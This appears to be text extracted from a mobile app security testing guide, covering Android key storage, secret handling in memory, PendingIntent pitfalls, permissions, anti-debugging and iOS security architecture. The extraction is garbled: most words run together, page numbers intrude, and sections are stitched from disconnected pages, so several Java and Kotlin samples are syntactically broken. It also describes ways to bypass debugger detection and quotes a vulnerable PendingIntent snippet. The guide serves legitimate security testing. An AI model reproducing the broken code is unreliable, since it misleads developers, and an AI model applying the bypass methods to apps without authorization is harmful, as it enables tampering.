Also, as the illustration of this approach, refer to the EncryptedSharedPreferences from androidx.security.crypto pack- age. Insecure options to store keys Alesssecurewayofstoringencryptionkeys,isintheSharedPreferencesofAndroid. WhenSharedPreferencesareused, thefileisonlyreadablebytheapplicationthatcreatedit. However, onrooteddevices, anyotherapplicationwithroot access can read the SharedPreferences file of other apps. This is not the case for the AndroidKeyStore, since Android- KeyStore access is managed on the kernel level, which needs considerably more work and skill to bypass without the AndroidKeyStoreclearingordestroyingthekeys. Thelastthreeoptionsaretousehardcodedencryptionkeysinthesourcecode,havingapredictableobfuscationfunction orkeyderivationfunctionbasedonstableattributes,andstoringgeneratedkeysinpublicplaceslike/sdcard/. Hardcoded encryptionkeysareanissue,sincethismeanseveryinstanceoftheapplicationusesthesameencryptionkey.

Next,whenyouhaveapredictablekeyderivationfunctionbasedonidentifierswhichareaccessibletootherapplications, theattackeronlyneedstofindtheKDFandapplyittothedevicetofindthekey. Lastly,storingencryptionkeyspublicly isalsohighlydiscouraged,asotherapplicationscanhavepermissiontoreadthepublicpartitionandstealthekeys.

KeyChain The KeyChain class is used to store and retrieve system-wide private keys and their corresponding certificates (chain). The user will be prompted to set a lock screen pin or password to protect the credential storage if something is being importedintotheKeyChainforthefirsttime. NotethattheKeyChainissystem-wide, everyapplicationcanaccessthe materialsstoredintheKeyChain. InspectthesourcecodetodeterminewhethernativeAndroidmechanismsidentifysensitiveinformation. Sensitiveinfor- mationshouldbeencrypted,notstoredincleartext. Forsensitiveinformationthatmustbestoredonthedevice,several APIcallsareavailabletoprotectthedataviatheKeyChainclass. Completethefollowingsteps: • Make sure that the app is using the Android KeyStore and Cipher mechanisms to securely store encrypted infor- mationonthedevice.

For an overview of possible sources of data exposure, check the documentation and identify application components before you examine the source code. For example, sensitive data from a backend may be in the HTTP client, the XML parser,etc. Youwantallthesecopiestoberemovedfrommemoryassoonaspossible. Inaddition, understandingtheapplication’sarchitectureandthearchitecture’sroleinthesystemwillhelpyouidentify sensitive information that doesn’t have to be exposed in memory at all. For example, assume your app receives data from one server and transfers it to another without any processing. That data can be handled in an encrypted format, whichpreventsexposureinmemory. However,ifyouneedtoexposesensitivedatainmemory,youshouldmakesurethatyourappisdesignedtoexposeas fewdatacopiesaspossibleasbrieflyaspossible. Inotherwords,youwantthehandlingofsensitivedatatobecentralized (i.e.,withasfewcomponentsaspossible)andbasedonprimitive,mutabledatastructures. The latter requirement gives developers direct memory access. Make sure that they use this access to overwrite the sensitivedatawithdummydata(typicallyzeroes). Examplesofpreferabledatatypesincludebyte []andchar [],but notStringorBigInteger. WheneveryoutrytomodifyanimmutableobjectlikeString,youcreateandchangeacopy oftheobject. Using non-primitive mutable types like StringBuffer and StringBuilder may be acceptable, but it’s indicative and requires care. Types like StringBuffer are used to modify content (which is what you want to do). To access such a type’svalue,however,youwouldusethetoStringmethod,whichwouldcreateanimmutablecopyofthedata. There areseveralwaystousethesedatatypeswithoutcreatinganimmutablecopy,buttheyrequiremoreeffortthanusinga primitivearray. SafememorymanagementisonebenefitofusingtypeslikeStringBuffer,butthiscanbeatwo-edged sword. Ifyoutrytomodifythecontentofoneofthesetypesandthecopyexceedsthebuffercapacity, thebuffersize willautomaticallyincrease. Thebuffercontentmaybecopiedtoadifferentlocation, leavingtheoldcontentwithouta referenceusetooverwriteit. Unfortunately,fewlibrariesandframeworksaredesignedtoallowsensitivedatatobeoverwritten. Forexample,destroy- ingakey,asshownbelow,doesn’tremovethekeyfrommemory: ExampleinJava: SecretKeysecretKey =newSecretKeySpec(\"key\".getBytes(),\"AES\"); secretKey.destroy(); ExampleinKotlin: valsecretKey:SecretKey =SecretKeySpec(\"key\".toByteArray(),\"AES\") secretKey.destroy() 201\\nOverwritingthebackingbyte-arrayfromsecretKey.getEncodeddoesn’tremovethekeyeither;theSecretKeySpec-based key returns a copy of the backing byte-array. See the sections below for the proper way to remove a SecretKey from memory. The RSA key pair is based on the BigInteger type and therefore resides in memory after its first use outside the An- droidKeyStore. Someciphers(suchastheAESCipherinBouncyCastle)donotproperlycleanuptheirbyte-arrays. User-provideddata(credentials,socialsecuritynumbers,creditcardinformation,etc.) isanothertypeofdatathatmay beexposedinmemory. Regardlessofwhetheryouflagitasapasswordfield,EditTextdeliverscontenttotheappvia theEditableinterface. Ifyourappdoesn’tprovideEditable.Factory,user-provideddatawillprobablybeexposedin memory for longer than necessary.

Sensitive assets have likely been loaded into memory at somepoint. Theobjectiveistoverifythatthisinformationisexposedasbrieflyaspossible.

Don’tuseimmutablestructures(e.g., StringandBigInteger)torepresentsecrets.

MostoftheJCAinterfacesandclassesaredefinedinthejava.security.*andjavax.crypto.*packages. Inaddition, thereareAndroidspecificpackagesandroid.security.*andandroid.security.keystore.*. KeyStoreandKeyChainprovideAPIsforstoringandusingkeys(behindthescene,KeyChainAPIusesKeyStoresystem). These systems allow to administer the full lifecycle of the cryptographic keys. Requirements and guidance for imple- mentationofcryptographickeymanagementcanbefoundinKeyManagementCheatSheet. Wecanidentifyfollowing phases: • generatingakey • usingakey • storingakey • archivingakey • deletingakey Pleasenotethatstoringofakeyisanalyzedinthechapter“TestingDataStorage”. These phases are managed by the Keystore/KeyChain system. However how the system works depends on how the application developer implemented it. For the analysis process you should focus on functions which are used by the applicationdeveloper. Youshouldidentifyandverifythefollowingfunctions: • Keygeneration • Randomnumbergeneration • Keyrotation AppsthattargetmodernAPIlevels,wentthroughthefollowingchanges: • ForAndroid7.0(APIlevel24)andabovetheAndroidDeveloperblogshowsthat: – Itisrecommendedtostopspecifyingasecurityprovider.

Security Provider Androidreliesonthejava.security.ProviderclasstoimplementJavaSecurityservices.

Thus,Androidappli- cationsshouldnotonlychoosethecorrectalgorithmsandprovideagoodconfiguration,insomecasestheyshouldalso payattentiontothestrengthoftheimplementationsinthelegacysecurityproviders. Youcanlistthesetofexistingsecurityprovidersusingfollowingcode: StringBuilderbuilder =newStringBuilder(); for(Providerprovider :Security.getProviders()){ builder.append(\"provider:\") .append(provider.getName()) .append(\"\") .append(provider.getVersion()) .append(\"(\") .append(provider.getInfo()) .append(\")\\n\"); } Stringproviders =builder.toString(); //nowdisplaythestringonthescreenorinthelogsfordebugging.

The same applies to provider. Application shouldcheckifusedsecurityproviderisup-to-dateandifnot,updateit. 220\\nOlder Android versions ForsomeapplicationsthatsupportolderversionsofAndroid(e.g.: onlyusedversionslowerthanAndroid7.0(APIlevel 24)),bundlinganup-to-datelibrarymaybetheonlyoption.

ConscryptforAndroidcanbeimportedthisway: dependencies { implementation 'org.conscrypt:conscrypt-android:last_version' } Next,theprovidermustberegisteredbycalling: Security.addProvider(Conscrypt.newProvider()) Key Generation The Android SDK allows you to specify how a key should be generated, and under which circumstances it can be used. Android6.0(APIlevel23)introducedtheKeyGenParameterSpecclassthatcanbeusedtoensurethecorrectkeyusage intheapplication. Forexample: StringkeyAlias =\"MySecretKey\"; KeyGenParameterSpeckeyGenParameterSpec =newKeyGenParameterSpec.Builder(keyAlias, KeyProperties.PURPOSE_ENCRYPT |KeyProperties.PURPOSE_DECRYPT) .setBlockModes(KeyProperties.BLOCK_MODE_CBC) .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_PKCS7) .setRandomizedEncryptionRequired(true) .build(); KeyGeneratorkeyGenerator =KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, \"AndroidKeyStore\"); keyGenerator.init(keyGenParameterSpec); SecretKeysecretKey =keyGenerator.generateKey(); TheKeyGenParameterSpecindicatesthatthekeycanbeusedforencryptionanddecryption,butnotforotherpurposes, suchassigningorverifying. Itfurtherspecifiestheblockmode(CBC),padding(PKCS#7), andexplicitlyspecifiesthat randomizedencryptionisrequired(thisisthedefault). Next,weenterAndroidKeyStoreasthenameoftheproviderin theKeyGenerator.getInstancecalltoensurethatthekeysarestoredintheAndroidKeyStore.

Note thatGCMistheonlymodeofAESthatdoesnotsupportpadding. Attemptingtousethegeneratedkeyinviolationoftheabovespecwouldresultinasecurityexception. Here’sanexampleofusingthatkeytoencrypt: StringAES_MODE =KeyProperties.KEY_ALGORITHM_AES +\"/\"+KeyProperties.BLOCK_MODE_CBC +\"/\"+KeyProperties.ENCRYPTION_PADDING_PKCS7; KeyStoreAndroidKeyStore =AndroidKeyStore.getInstance(\"AndroidKeyStore\"); //byte[]input Keykey =AndroidKeyStore.getKey(keyAlias,null); Ciphercipher =Cipher.getInstance(AES_MODE); cipher.init(Cipher.ENCRYPT_MODE,key); byte[]encryptedBytes =cipher.doFinal(input); byte[]iv=cipher.getIV(); //saveboththeIVandtheencryptedBytes BoththeIV(initializationvector)andtheencryptedbytesneedtobestored;otherwisedecryptionisnotpossible.

Prior to Android 6.0 (API level 23), AES key generation was not supported. As a result, many implementations chose to use RSA and generated a public-private key pair for asymmetric encryption using KeyPairGeneratorSpec or used SecureRandomtogenerateAESkeys. Here’sanexampleofKeyPairGeneratorandKeyPairGeneratorSpecusedtocreatetheRSAkeypair: DatestartDate =Calendar.getInstance().getTime(); CalendarendCalendar =Calendar.getInstance(); endCalendar.add(Calendar.YEAR,1); DateendDate =endCalendar.getTime(); KeyPairGeneratorSpeckeyPairGeneratorSpec =newKeyPairGeneratorSpec.Builder(context) .setAlias(RSA_KEY_ALIAS) .setKeySize(4096) .setSubject(newX500Principal(\"CN=\" +RSA_KEY_ALIAS)) .setSerialNumber(BigInteger.ONE) .setStartDate(startDate) .setEndDate(endDate) .build(); KeyPairGeneratorkeyPairGenerator =KeyPairGenerator.getInstance(\"RSA\", \"AndroidKeyStore\"); keyPairGenerator.initialize(keyPairGeneratorSpec); KeyPairkeyPair =keyPairGenerator.generateKeyPair(); This sample creates the RSA key pair with a key size of 4096-bit (i.e. modulus size).

In other words, the user “unlocks” the app or some inner layer of functionality by providing a valid PIN, password or biometric characteristics such as face or fingerprint, which is verified by referencing local data.

TheBiometricPromptclassisasignificantimprovement,asitallowstohaveaconsistentUIforbiometricauthentication onAndroidandalsosupportsmoresensorsthanjustfingerprint. This is different to the FingerprintManager class which only supports fingerprint sensors and provides no UI, forcing developerstobuildtheirownfingerprintUI. AverydetailedoverviewandexplanationoftheBiometricAPIonAndroidwaspublishedontheAndroidDeveloperBlog. FingerprintManager (deprecated in Android 9 (API level 28)) Android 6.0 (API level 23) introduced public APIs for authenticating users via fingerprint, but is deprecated in Android 9 (API level 28). Access to the fingerprint hardware is provided through the FingerprintManager class. An app can request fingerprint authentication by instantiating aFingerprintManager object and calling its authenticate method. Thecallerregisterscallbackmethodstohandlepossibleoutcomesoftheauthenticationprocess(i.e.success,failure,or error). Notethatthismethoddoesn’tconstitutestrongproofthatfingerprintauthenticationhasactuallybeenperformed -forexample,theauthenticationstepcouldbepatchedoutbyanattacker,orthe“success”callbackcouldbeoverloaded usingdynamicinstrumentation. You can achieve better security by using the fingerprint API in conjunction with the Android KeyGenerator class. With thisapproach,asymmetrickeyisstoredintheAndroidKeyStoreandunlockedwiththeuser’sfingerprint. Forexample, to enable user access to a remote service, an AES key is created which encrypts the authentication token. By calling setUserAuthenticationRequired(true)whencreatingthekey,itisensuredthattheusermustre-authenticatetore- trieveit. Theencryptedauthenticationtokencanthenbesaveddirectlyonthedevice(e.g.viaSharedPreferences). This designisarelativelysafewaytoensuretheuseractuallyenteredanauthorizedfingerprint.

They request this access by declaring the permissions they need to use system data and features. Depending on how sensitiveorcriticalthedataorfeatureis,theAndroidsystemwillgrantthepermissionautomaticallyorasktheuserto approvetherequest. To enhance user privacy and mitigate privacy risks, it is crucial for Android apps to minimize permission requests and only request access to sensitive information when absolutely necessary. The Android developer documentation offers valuableinsightsandbestpracticestohelpappsachievethesameleveloffunctionalitywithoutrequiringdirectaccess tosensitiveresources: • Minimizeyourpermissionrequests • Apppermissionsbestpractices • PermissionsandAPIsthatAccessSensitiveInformation Android permissions can be classified into distinct categories depending on the extent of restricted data access and permittedactionsthattheygranttoanapp. Thisclassificationincludestheso-called“ProtectionLevel”asshownonthe permissionsAPIreferencepageandAndroidManifest.xmlSourceDefinitions. • Install-time permissions: grant limited access to restricted data or let the app perform restricted actions that minimally affect the system or other apps. They are granted automatically at installation time (Android 6.0 (API level23)orhigher). – ProtectionLevel: normal.

This has changed starting at Android 8.0 (API level 26): whenever an app requests a permission at runtime, the system will grant exclusively that specific permission. However, note that allsubsequentrequestsforpermissionsinthatpermissiongroupwillbeautomaticallygrantedwithout showingthepermissionsdialogtotheuser. SeethisexamplefromtheAndroiddeveloperdocumentation: SupposeanapplistsbothREAD_EXTERNAL_STORAGEandWRITE_EXTERNAL_STORAGEinitsmanifest. The apprequestsREAD_EXTERNAL_STORAGEandtheusergrantsit.

ContentProviderPermissionEnforcement: Permissions applied via android:permission attribute within the <provider> tag restrict access to data in a Content- Provider. Content providers have an important additional security facility called URI permissions which is described next. Unlike the other components, ContentProviders have two separate permission attributes that can be set, an- droid:readPermissionrestrictswhocanreadfromtheprovider,andandroid:writePermissionrestrictswhocanwrite toit.

TheIPCsystemfunctionalityofferedbymobileapplicationplatformsshouldbeusedbecauseitis muchmorematurethantraditionaltechniques. UsingIPCmechanismswithnosecurityinmindmaycausetheapplication toleakorexposesensitivedata. ThefollowingisalistofAndroidIPCMechanismsthatmayexposesensitivedata: • Binders • Services • BoundServices • AIDL • Intents • ContentProviders Pending Intents Oftenwhiledealingwithcomplexflowsduringappdevelopment,therearesituationswhereanappAwantsanotherapp B to perform a certain action in the future, on app A’s behalf. Trying to implement this by only usingIntents leads to varioussecurityproblems,likehavingmultipleexportedcomponents. Tohandlethisusecaseinasecuremanner,Android providesthePendingIntentAPI. PendingIntentaremostcommonlyusedfornotifications,appwidgets,mediabrowserservices,etc. Whenusedfornoti- fications,PendingIntentisusedtodeclareanintenttobeexecutedwhenauserperformsanactionwithanapplication’s notification. Thenotificationrequiresacallbacktotheapplicationtotriggeranactionwhentheuserclicksonit. Internally, aPendingIntentobjectwrapsanormalIntentobject(referredasbaseintent)thatwilleventuallybeused to invoke an action. For example, the base intent specifies that an activity A should be started in an application. The receivingapplicationofthePendingIntent,willunwrapandretrievethisbaseintentandinvoketheactivityAbycalling thePendingIntent.sendfunction. AtypicalimplementationforusingPendingIntentisbelow: Intentintent =newIntent(applicationContext,SomeActivity.class); //baseintent //createapendingintent PendingIntentpendingIntent =PendingIntent.getActivity(applicationContext,0,intent,PendingIntent.FLAG_IMMUTABLE); //sendthependingintenttoanotherapp IntentanotherIntent =newIntent(); anotherIntent.setClassName(\"other.app\",\"other.app.MainActivity\"); anotherIntent.putExtra(\"pendingIntent\",pendingIntent); startActivity(anotherIntent); WhatmakesaPendingIntentsecureisthat,unlikeanormalIntent,itgrantspermissiontoaforeignapplicationtouse theIntent(thebaseintent)itcontains,asifitwerebeingexecutedbyyourapplication’sownprocess. Thisallowsan applicationtofreelyusethemtocreatecallbackswithouttheneedtocreateexportedactivities. Ifnotimplementedcorrectly,amaliciousapplicationcanhijackaPendingIntent. Forexample,inthenotificationexam- ple above, a malicious application with android.permission.BIND_NOTIFICATION_LISTENER_SERVICE can bind to the notificationlistenerserviceandretrievethependingintent. TherearecertainsecuritypitfallswhenimplementingPendingIntents,whicharelistedbelow: • Mutable fields: A PendingIntent can have mutable and empty fields that can be filled by a malicious applica- tion. Thiscanleadtoamaliciousapplicationgainingaccesstonon-exportedapplicationcomponents. Usingthe PendingIntent.FLAG_IMMUTABLEflagmakesthePendingIntentimmutableandpreventsanychangestothefields. PriortoAndroid12(APIlevel31),thePendingIntentwasmutablebydefault,whilesinceAndroid12(APIlevel31) itischangedtoimmutablebydefaulttopreventaccidentalvulnerabilities. • Use of implicit intent: A malicious application can receive a PendingIntent and then update the base intent totargetthecomponentandpackagewithinthemaliciousapplication. Asamitigation,ensurethatyouexplicitly specifytheexactpackage,actionandcomponentthatwillreceivethebaseintent. ThemostcommoncaseofPendingIntentattackiswhenamaliciousapplicationisabletointerceptit. Forfurtherdetails,checktheAndroiddocumentationonusingapendingintent. 254\\nImplicit Intents An Intent is a messaging object that you can use to request an action from another application component. Although intentsfacilitatecommunicationbetweencomponentsinavarietyofways,therearethreebasicusecases: startingan activity,startingaservice,anddeliveringabroadcast. AccordingtotheAndroidDevelopersDocumentation,Androidprovidestwotypesofintents: • Explicitintentsspecifywhichapplicationwillsatisfytheintentbyprovidingeitherthetargetapp’spackagename orafullyqualifiedcomponentclassname. Typically,you’lluseanexplicitintenttostartacomponentinyourown app,becauseyouknowtheclassnameoftheactivityorserviceyouwanttostart. Forexample,youmightwantto startanewactivityinyourappinresponsetoauseraction,orstartaservicetodownloadafileinthebackground. //Note thespecificationofaconcretecomponent(DownloadActivity)thatisstartedbytheintent. IntentdownloadIntent =newIntent(this,DownloadActivity.class); downloadIntent.setAction(\"android.intent.action.GET_CONTENT\") startActivityForResult(downloadIntent); • Implicit intents do not name a specific component, but instead declare a general action to be performed that anotherapp’scomponentcanhandle. Forexample,ifyouwanttoshowtheuseralocationonamap,youcanuse animplicitintenttoaskanothercapableapptoshowaspecificlocationonamap.

Parcelsareoften used to pack a class as part of a Bundle for an Intent. Here’s an Android developer documentation example that implementsParcelable: public class MyParcelable implements Parcelable { private intmData; public intdescribeContents(){ 256\\nreturn 0; } public void writeToParcel(Parcelout,intflags){ out.writeInt(mData); } public static final Parcelable.Creator<MyParcelable>CREATOR =newParcelable.Creator<MyParcelable>(){ public MyParcelable createFromParcel(Parcelin){ return newMyParcelable(in); } public MyParcelable[]newArray(intsize){ return newMyParcelable[size]; } }; private MyParcelable(Parcelin){ mData =in.readInt(); } } Because this mechanism that involves Parcels and Intents may change over time, and the Parcelable may contain IBinderpointers,storingdatatodiskviaParcelableisnotrecommended. Protocol Buffers ProtocolBuffersbyGoogle,areaplatform-andlanguageneutralmechanismforserializingstructureddatabymeansof theBinaryDataFormat. TherehavebeenafewvulnerabilitieswithProtocolBuffers,suchasCVE-2015-5237. Notethat ProtocolBuffersdonotprovideanyprotectionforconfidentiality: thereisnobuiltinencryption. Overlay Attacks Screen overlay attacks occur when a malicious application manages to put itself on top of another application which remainsworkingnormallyasifitwereontheforeground. ThemaliciousappmightcreateUIelementsmimickingthelook and feel and the original app or even the Android system UI. The intention is typically to make users believe that they keep interacting with the legitimate app and then try to elevate privileges (e.g by getting some permissions granted), stealthyphishing,captureusertapsandkeystrokesetc. ThereareseveralattacksaffectingdifferentAndroidversionsincluding: • Tapjacking(Android6.0(APIlevel23)andlower)abusesthescreenoverlayfeatureofAndroidlisteningfortaps andinterceptinganyinformationbeingpassedtotheunderlyingactivity. • Cloak&DaggerattacksaffectappstargetingAndroid5.0(APIlevel21)toAndroid7.1(APIlevel25).

Testing for Vulnerable Implementation of PendingIntent Platform: android MASVSV1: MSTG-PLATFORM-4 MASVSV2: MASVS-PLATFORM-1 Overview When testing Pending Intents you must ensure that they are immutable and that the app explicitly specifies the exact package,action,andcomponentthatwillreceivethebaseintent. Static Analysis To identify vulnerable implementations, static analysis can be performed by looking for API calls used for obtaining a PendingIntent. SuchAPIsarelistedbelow: PendingIntent getActivity(Context,int,Intent,int) PendingIntent getActivity(Context,int,Intent,int,Bundle) PendingIntent getActivities(Context,int,Intent,int,Bundle) PendingIntent getActivities(Context,int,Intent,int) PendingIntent getForegroundService(Context,int,Intent,int) PendingIntent getService(Context,int,Intent,int) Onceanyoftheabovefunctionisspotted,checktheimplementationofthebaseintentandthePendingIntentforthe securitypitfallslistedinthePendingIntentssection. 267\\nForexample,inA-156959408(CVE-2020-0389),thebaseintentisimplicitandalsothePendingIntentismutable,thus makingitexploitable. private Notification createSaveNotification(Uriuri){ IntentviewIntent =newIntent(Intent.ACTION_VIEW) .setFlags(Intent.FLAG_ACTIVITY_NEW_TASK |Intent.FLAG_GRANT_READ_URI_PERMISSION) .setDataAndType(uri,\"video/mp4\");//ImplicitIntent //...skip...

There are two common ways to designate a component as exported. The obvious one is setting the export tag to true android:exported=\"true\". The second wayinvolvesdefiningan<intent-filter>withinthecomponentelement(<activity>,<service>,<receiver>). When this is done, the export tag is automatically set to “true”. To prevent all other Android apps from interacting with the IPC component element, be sure that the android:exported=\"true\" value and an <intent-filter> aren’t in their AndroidManifest.xmlfilesunlessthisisnecessary. Rememberthatusingthepermissiontag(android:permission)willalsolimitotherapplications’accesstoacomponent. If your IPC is intended to be accessible to other applications, you can apply a security policy with the <permission> elementandsetaproperandroid:protectionLevel.

Checking for Weaknesses in Third Party Libraries Platform: android MASVSV1: MSTG-CODE-5 MASVSV2: MASVS-CODE-3 298\\nOverview Static Analysis Detecting vulnerabilities in third party dependencies can be done by means of the OWASP Dependency checker. This is best done by using a gradle plugin, such as dependency-check-gradle. In order to use the plugin, the following steps need to be applied: Install the plugin from the Maven central repository by adding the following script to your build.gradle: buildscript{ repositories{ mavenCentral() } dependencies{ classpath'org.owasp:dependency-check-gradle:3.2.0' } } applyplugin:'org.owasp.dependencycheck' Oncegradlehasinvokedtheplugin,youcancreateareportbyrunning: gradleassemble gradledependencyCheckAnalyze --info Thereportwillbeinbuild/reportsunlessotherwiseconfigured.

Anti-Debugging Debuggingisahighlyeffectivewaytoanalyzeruntimeappbehavior. Itallowsthereverseengineertostepthroughthe code,stopappexecutionatarbitrarypoints,inspectthestateofvariables,readandmodifymemory,andalotmore. Anti-debugging features can be preventive or reactive.

The “more-is-better” rule applies: to maximize effectiveness,defenderscombinemultiplemethodsofpreventionanddetectionthatoperateondifferentAPIlayersand arewelldistributedthroughouttheapp. As mentioned in the “Reverse Engineering and Tampering” chapter, we have to deal with two debugging protocols on Android: we can debug on the Java level with JDWP or on the native layer via a ptrace-based debugger.

Most JDWP anti-debugging tricks (which may be safe for timer-based checks) won’t catch classicaldebuggersbasedonptraceandtherefore,manyAndroidanti-debuggingtricksincludeptrace,oftenexploiting thefactthatonlyonedebuggeratatimecanattachtoaprocess. Checking TracerPid When you debug an app and set a breakpoint on native code, Android Studio will copy the needed files to the target deviceandstartthelldb-serverwhichwilluseptracetoattachtotheprocess. Fromthismomenton,ifyouinspectthe statusfileofthedebuggedprocess(/proc/<pid>/statusor/proc/self/status),youwillseethatthe“TracerPid”field hasavaluedifferentfrom0,whichisasignofdebugging.

You’lltherefore usually find more elaborate schemes, involving multiple processes and threads as well as some form of monitoring to impedetampering. Commonmethodsinclude • forkingmultipleprocessesthattraceoneanother, • keepingtrackofrunningprocessestomakesurethechildrenstayalive, • monitoringvaluesinthe/procfilesystem,suchasTracerPIDin/proc/pid/status. Let’slookatasimpleimprovementforthemethodabove. Aftertheinitialfork,welaunchintheparentanextrathread that continually monitors the child’s status. Depending on whether the app has been built in debug or release mode (which is indicated by the android:debuggable flag in the manifest), the child process should do one of the following things: • In release mode: The call to ptrace fails and the child crashes immediately with a segmentation fault (exit code 11). • In debug mode: The call to ptrace works and the child should run indefinitely. Consequently, a call to wait- pid(child_pid)shouldneverreturn. Ifitdoes,somethingisfishyandwewouldkillthewholeprocessgroup.

Checking the integrity of the respectivememoryregionsisonewaytodetectthiskindofhook. TheGlobalOffsetTable(GOT)isusedtoresolvelibraryfunctions. Duringruntime,thedynamiclinkerpatchesthistable withtheabsoluteaddressesofglobalsymbols. GOThooksoverwritethestoredfunctionaddressesandredirectlegitimate functioncallstoadversary-controlledcode. Thistypeofhookcanbedetectedbyenumeratingtheprocessmemorymap andverifyingthateachGOTentrypointstoalegitimatelyloadedlibrary. 314\\nIncontrasttoGNUld,whichresolvessymboladdressesonlyaftertheyareneededforthefirsttime(lazybinding),the AndroidlinkerresolvesallexternalfunctionsandwritestherespectiveGOTentriesimmediatelyafteralibraryisloaded (immediatebinding). YoucanthereforeexpectallGOTentriestopointtovalidmemorylocationsinthecodesectionsof theirrespectivelibrariesduringruntime. GOThookdetectionmethodsusuallywalktheGOTandverifythis. Inline hooks work by overwriting a few instructions at the beginning or end of the function code. During runtime, this so-called trampoline redirects execution to the injected code. You can detect inline hooks by inspecting the prologues andepiloguesoflibraryfunctionsforsuspectinstructions,suchasfarjumpstolocationsoutsidethelibrary. Obfuscation Thechapter“MobileAppTamperingandReverseEngineering”introducesseveralwell-knownobfuscationtechniquesthat canbeusedinmobileappsingeneral. Androidappscanimplementsomeofthoseobfuscationtechniquesusingdifferenttooling.

Dynamic Analysis There are several ways of detecting StrictMode; the best choice depends on how the policies’ roles are implemented. Theyinclude • Logcat, • awarningdialog, • applicationcrash. Testing Anti-Debugging Detection Platform: android MASVSV1: MSTG-RESILIENCE-2 MASVSV2: MASVS-RESILIENCE-4 Bypassing Debugger Detection There’s no generic way to bypass anti-debugging: the best method depends on the particular mechanism(s) used to prevent or detect debugging and the other defenses in the overall protection scheme. For example, if there are no integrity checks or you’ve already deactivated them, patching the app might be the easiest method. In other cases, a hooking framework or kernel modules might be preferable. The following methods describe different approaches to bypassdebuggerdetection: • Patchingtheanti-debuggingfunctionality: DisabletheunwantedbehaviorbysimplyoverwritingitwithNOPinstruc- tions. Notethatmorecomplexpatchesmayberequirediftheanti-debuggingmechanismiswelldesigned. • UsingFridaorXposedtohookAPIsontheJavaandnativelayers: manipulatethereturnvaluesoffunctionssuch asisDebuggableandisDebuggerConnectedtohidethedebugger. • Changingtheenvironment: Androidisanopenenvironment.

Inthefollowingchapters,we describe iOS security architecture, explain a basic security testing methodology, and providereverse engineering how- tos. iOS Security Architecture TheiOSsecurityarchitecture,officiallydocumentedbyAppleintheiOSSecurityGuide,consistsofsixcorefeatures. This securityguideisupdatedbyAppleforeachmajoriOSversion: • HardwareSecurity • SecureBoot • CodeSigning • Sandbox • EncryptionandDataProtection • GeneralExploitMitigations 327\\nHardware Security The iOS security architecture makes good use of hardware-based security features that enhance overall performance. Each iOS device comes with two built-in Advanced Encryption Standard (AES) 256-bit keys. The device’s unique IDs (UIDs)andadevicegroupIDs(GIDs)areAES256-bitkeysfused(UID)orcompiled(GID)intotheApplicationProcessor (AP)andSecureEnclaveProcessor(SEP)duringmanufacturing. There’snodirectwaytoreadthesekeyswithsoftwareor debugginginterfacessuchasJTAG.EncryptionanddecryptionoperationsareperformedbyhardwareAEScrypto-engines thathaveexclusiveaccesstothesekeys. TheGIDisavaluesharedbyallprocessorsinaclassofdevicesusedtopreventtamperingwithfirmwarefilesandother cryptographic tasks not directly related to the user’s private data. UIDs, which are unique to each device, are used to protect the key hierarchy that’s used for device-level file system encryption. Because UIDs aren’t recorded during manufacturing,notevenApplecanrestorethefileencryptionkeysforaparticulardevice.

Its purpose is focused on verifying the boot process integrity, ensuringthatthesystemanditscomponentsarewrittenanddistributedbyApple. TheSecureBootchainconsistsofthe kernel,thebootloader,thekernelextension,andthebasebandfirmware.

Learnmore: • CodeSigningGuide(ArchivedAppleDeveloperDocumentation) • CodeSigning(AppleDeveloperDocumentation) • DemystifyingiOSCodeSignature Encryption and Data Protection FairPlay Code Encryption is applied to apps downloaded from the App Store. FairPlay was developed as a DRM when purchasing multimedia content. Originally, FairPlay encryption was applied to MPEG and QuickTime streams, but the samebasicconceptscanalsobeappliedtoexecutablefiles. Thebasicideaisasfollows: OnceyouregisteranewApple user account, or Apple ID, a public/private key pair will be created and assigned to your account. The private key is securelystoredonyourdevice. ThismeansthatFairPlay-encryptedcodecanbedecryptedonlyondevicesassociated withyouraccount. ReverseFairPlayencryptionisusuallyobtainedbyrunningtheapponthedevice,thendumpingthe decryptedcodefrommemory(seealso“BasicSecurityTestingoniOS”). 329\\nApplehasbuiltencryptionintothehardwareandfirmwareofitsiOSdevicessincethereleaseoftheiPhone3GS.Every devicehasadedicatedhardware-basedcryptographicenginethatprovidesanimplementationoftheAES256-bitencryp- tionandtheSHA-1hashingalgorithms.

Buildingencryptionintothephysicalarchitecturemakesitadefaultsecurityfeaturethatcanencryptalldatastoredonan iOSdevice. Asaresult,dataprotectionisimplementedatthesoftwarelevelandworkswiththehardwareandfirmware encryptiontoprovidemoresecurity. When data protection is enabled, by simply establishing a passcode in the mobile device, each data file is associated with a specific protection class. Each class supports a different level of accessibility and protects data on the basis of when the data needs to be accessed. The encryption and decryption operations associated with each class are based onmultiplekeymechanismsthatutilizethedevice’sUIDandpasscode,aclasskey,afilesystemkey,andaper-filekey. The per-file key is used to encrypt the file’s contents. The class key is wrapped around the per-file key and stored in the file’s metadata. The file system key is used to encrypt the metadata. The UID and passcode protect the class key. This operation is invisible to users. To enable data protection, the passcode must be used when accessing the device. Thepasscodeunlocksthedevice. CombinedwiththeUID,thepasscodealsocreatesiOSencryptionkeysthataremore resistanttohackingandbrute-forceattacks. Enablingdataprotectionisthemainreasonforuserstousepasscodeson theirdevices. Sandbox TheappsandboxisaniOSaccesscontroltechnology. Itisenforcedatthekernellevel. Itspurposeislimitingsystemand userdatadamagethatmayoccurwhenanappiscompromised.

Instead,theymustbeaccessedthroughApple’spublicframeworks. General Exploit Mitigations iOS implements address space layout randomization (ASLR) and eXecute Never (XN) bit to mitigate code execution at- tacks. ASLRrandomizesthememorylocationoftheprogram’sexecutablefile, data, heap, andstackeverytimetheprogram isexecuted. Becausethesharedlibrariesmustbestatictobeaccessedbymultipleprocesses,theaddressesofshared libraries are randomized every time the OS boots instead of every time the program is invoked. This makes specific function and library memory addresses hard to predict, thereby preventing attacks such as the return-to-libc attack, whichinvolvesthememoryaddressesofbasiclibcfunctions.

